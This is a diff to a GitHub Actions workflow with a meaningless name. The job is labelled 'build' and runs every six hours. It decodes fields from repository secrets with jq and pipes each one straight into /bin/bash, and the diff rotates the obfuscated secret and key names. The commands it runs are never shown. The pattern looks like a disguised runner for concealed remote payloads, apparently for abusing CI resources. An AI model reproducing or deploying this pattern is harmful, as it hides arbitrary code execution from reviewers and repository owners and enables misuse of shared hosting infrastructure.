@@ -2,27 +2,23 @@ name: tujiulong4219
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 4/6 * * *'
-
+    - cron: '42 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tujiulong4219
         env:
-          m8: ${{ secrets.m8 }}
+          ch020: ${{ secrets.ch020 }}
         run: |
-          echo $m8 | jq -r .lsno2 | /bin/bash
-          echo $as54523 | jq -r .xwqes69645 | /bin/bash
-          echo $z5 | jq -r .fjsz28095 | /bin/bash
-          echo $u8746 | jq -r .hd694 | /bin/bash
-          echo $if411 | jq -r .s66 | /bin/bash
-          echo $qxut19684 | jq -r .ns362 | /bin/bash
-          echo $zxou4 | jq -r .fx58 | /bin/bash
-          echo $l836 | jq -r .xhl65 | /bin/bash
-          echo $b69 | jq -r .rzw0922 | /bin/bash
-          echo $fxgy1419 | jq -r .wi9 | /bin/bash
-          echo $l262 | jq -r .z3346 | /bin/bash
+          echo $ch020 | jq -r .hldai0 | /bin/bash
+          echo $i51652 | jq -r .bk71 | /bin/bash
+          echo $t1 | jq -r .jefx89225 | /bin/bash
+          echo $yjg58277 | jq -r .eckdf141 | /bin/bash
+          echo $wr14344 | jq -r .t2851 | /bin/bash
+          echo $xu72 | jq -r .t63 | /bin/bash
+          echo $naa2249 | jq -r .t71 | /bin/bash
+          echo $sgzr4 | jq -r .mq23693 | /bin/bash
+          echo $dnajh13 | jq -r .n6048 | /bin/bash
 
